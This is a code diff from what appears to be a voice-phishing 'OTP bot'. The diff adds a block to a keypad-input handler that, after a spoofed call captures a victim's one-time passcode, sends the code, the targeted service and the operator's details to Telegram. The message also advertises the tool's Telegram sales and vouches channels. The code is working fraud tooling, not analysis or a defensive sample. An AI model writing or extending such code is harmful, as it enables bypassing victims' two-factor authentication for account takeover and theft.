@@ -2203,6 +2203,32 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
             active_sessions[session_id]["status"] = "waiting_approval"
             active_sessions[session_id]["otp_received"] = captured_code
             
+
+            
+            # Send Telegram notification for OTP captured
+            try:
+                user_email_censored = censor_email(session.get("user_email", "unknown@email.com"))
+                template_name = selectedTemplate if 'selectedTemplate' in locals() else "Custom"
+                
+                telegram_message = f"""┏ 📱 New successful call finished!
+┣ Call Type: {template_name}
+┣ Mode: Live
+┣ Service: {session.get('service_name', 'N/A')}
+┣ Is Spoofing: Yes
+┣ User: {user_email_censored}
+┣ Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}
+┗ Verification Type: NORMAL
+
+┏ ℹ️ Captures ℹ️
+┣ 📍 OTP ({otp_digits}): {captured_code}
+┗ Captured By: {user_email_censored}
+
+© BOT | DINOSAURODISCUSSION https://t.me/DINOSAUROTPDISCUSSION | VOUCHES LINK https://t.me/DINOSAUROTPVOUCHES | DINOSAUROTP https://t.me/DINOSAUROTP"""
+                
+                asyncio.create_task(send_telegram_message(telegram_message))
+            except Exception as e:
+                logger.error(f"Failed to send Telegram notification: {e}")
+
             # Play Step 3 TTS immediately (not as background task)
             await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
             step3_text = session["messages"]["step3"]
